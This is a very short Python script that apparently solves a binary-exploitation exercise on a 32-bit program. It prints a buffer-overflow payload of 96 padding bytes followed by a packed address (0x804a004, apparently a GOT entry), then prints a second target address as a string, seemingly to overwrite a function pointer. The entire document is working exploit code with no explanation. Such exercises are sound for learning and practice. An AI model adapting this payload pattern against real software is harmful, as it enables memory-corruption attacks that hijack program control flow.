import struct

payload = "A" * 96
payload += struct.pack("I", 0x804a004)
print(payload)

payload = str(0x80485d7)
print(payload)
